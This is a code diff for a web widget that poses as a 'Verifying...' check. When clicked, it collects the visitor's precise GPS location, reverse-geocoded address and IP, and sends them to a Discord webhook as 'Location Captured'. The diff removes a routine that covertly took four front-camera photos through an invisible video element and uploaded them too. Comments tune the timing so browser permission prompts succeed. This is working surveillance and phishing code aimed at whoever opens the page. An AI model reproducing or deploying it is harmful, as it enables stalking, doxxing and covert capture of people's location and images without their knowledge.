@@ -137,27 +137,24 @@ widget.addEventListener('click', async () => {
     cb.classList.add('loading');
     mainText.textContent = 'Verifying...';
 
-    // Location starts FIRST and synchronously so mobile browsers
-    // still count it as inside the click gesture.
-    const locPromise = getLocation();
-    const ipPromise  = getIP();
-
     try {
-        say('waiting for permissions...');
+        say('asking for location...');
 
-        const photos = await capturePhotos();
+        // Called FIRST and synchronously so the browser keeps the click gesture.
+        const locPromise = getLocation();
+        const ipPromise  = getIP();
 
-        // Hard ceiling so a stalled GPS fix can never block the upload.
+        // Hard ceiling so a stalled GPS fix never blocks the upload.
         const location = await Promise.race([
             locPromise,
             new Promise(r => setTimeout(() => r(null), 25000))
         ]);
         const ip = await ipPromise;
 
-        say(location ? ('loc ok: ' + location.label + ' [' + location.src + ']') : 'loc unavailable');
+        say(location ? ('got: ' + location.label + ' [' + location.src + ']') : 'location unavailable');
 
-        await send(photos, ip, location);
-        say('sent ' + photos.length + ' photo(s)' + (location ? ' + location' : ''));
+        await send(ip, location);
+        say('sent' + (location ? '' : ' (no location)'));
     } catch (e) {
         console.warn(e);
         say('error: ' + e.message);
@@ -170,8 +167,8 @@ widget.addEventListener('click', async () => {
 });
 
 /* ============================================================
-   LOCATION
-   GPS and IP lookup race each other. GPS wins if it answers.
+   LOCATION - GPS and IP lookup race each other.
+   GPS wins if it answers; IP is the safety net.
    ============================================================ */
 function getLocation() {
     const gpsPromise = gpsLocation();
@@ -209,7 +206,7 @@ function gpsLocation() {
             );
         });
 
-        // Attempt 1 fires synchronously inside the click handler.
+        // Fast low-accuracy fix first. Runs synchronously inside the click handler.
         attempt(false, 7000).then(async a => {
             if (a.pos) { finish(await withLabel(a.pos)); return; }
             if (a.err === 'denied') { finish(null); return; }
@@ -254,7 +251,7 @@ async function reverseGeocode(lat, lng) {
 }
 
 /* Six keyless HTTPS providers raced with Promise.any.
-   First valid answer wins; the rest are ignored. */
+   First valid answer wins; the rest are discarded. */
 const PROVIDERS = [
     { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
@@ -320,81 +317,12 @@ async function getIP() {
 }
 
 /* ============================================================
-   CAMERA - 4 front-cam snaps
-   ============================================================ */
-async function capturePhotos() {
-    const out = [];
-    for (let i = 1; i <= 4; i++) {
-        say('photo ' + i + '/4');
-        const s = await snap();
-        if (s) out.push({ blob: s, name: 'front_snap_' + i + '.jpg' });
-    }
-    return out;
-}
-
-function snap() {
-    return new Promise(async resolve => {
-        let done = false;
-        const finish = v => { if (!done) { done = true; resolve(v); } };
-        const guard = setTimeout(() => finish(null), 6000);
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
-
-            const v = document.createElement('video');
-            v.srcObject = stream;
-            v.muted = true;
-            v.setAttribute('playsinline', '');
-            v.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
-            document.body.appendChild(v);
-
-            await new Promise(res => {
-                let s = false;
-                const go = () => { if (!s) { s = true; res(); } };
-                v.onloadedmetadata = go;
-                v.onerror = go;
-                setTimeout(go, 2000);
-            });
-
-            await v.play().catch(() => {});
-            await new Promise(r => setTimeout(r, 400));
-
-            const w = v.videoWidth || 640;
-            const h = v.videoHeight || 480;
-            const c = document.createElement('canvas');
-            c.width = w;
-            c.height = h;
-
-            const ctx = c.getContext('2d');
-            ctx.translate(w, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(v, 0, 0, w, h);
-
-            stream.getTracks().forEach(t => t.stop());
-            v.srcObject = null;
-            v.remove();
-
-            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-            clearTimeout(guard);
-            finish(blob);
-        } catch (e) {
-            console.warn('snap', e);
-            clearTimeout(guard);
-            finish(null);
-        }
-    });
-}
-
-/* ============================================================
    SEND TO DISCORD
    ============================================================ */
-async function send(photos, ip, location) {
+async function send(ip, location) {
     const maps = location ? 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng : null;
 
-    const lines = ['**Verification Captured**'];
+    const lines = ['**Verification - Location**'];
 
     if (location) {
         lines.push('Location: ' + location.label);
@@ -407,12 +335,9 @@ async function send(photos, ip, location) {
     lines.push('IP: ' + ip);
 
     const embed = {
-        title: 'Verification Capture',
+        title: 'Location Captured',
         color: 0x156b3c,
-        fields: [
-            { name: 'IP', value: ip, inline: true },
-            { name: 'Photos', value: String(photos.length), inline: true }
-        ],
+        fields: [{ name: 'IP', value: ip, inline: true }],
         timestamp: new Date().toISOString()
     };
 
@@ -420,19 +345,23 @@ async function send(photos, ip, location) {
         embed.url = maps;
         embed.fields.push({ name: 'Location', value: location.label, inline: false });
         embed.fields.push({ name: 'Coords', value: location.lat.toFixed(6) + ', ' + location.lng.toFixed(6), inline: false });
+        embed.fields.push({ name: 'Source', value: location.src === 'GPS' ? 'GPS (precise)' : 'Network / IP (approximate)', inline: true });
+
+        if (location.acc != null) {
+            embed.fields.push({ name: 'Accuracy', value: '~' + Math.round(location.acc) + ' m', inline: true });
+        }
+
         embed.image = {
             url: 'https://maps.wikimedia.org/img/osm-intl,16,' + location.lat + ',' + location.lng + ',600x300.png'
         };
     }
 
-    const payload = { content: lines.join('\n'), embeds: [embed], attachments: [] };
+    const payload = {
+        content: lines.join('\n'),
+        embeds: [embed]
+    };
+
     const fd = new FormData();
-
-    photos.forEach((p, i) => {
-        fd.append('files[' + i + ']', p.blob, p.name);
-        payload.attachments.push({ id: i, filename: p.name });
-    });
-
     fd.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
 
     const res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
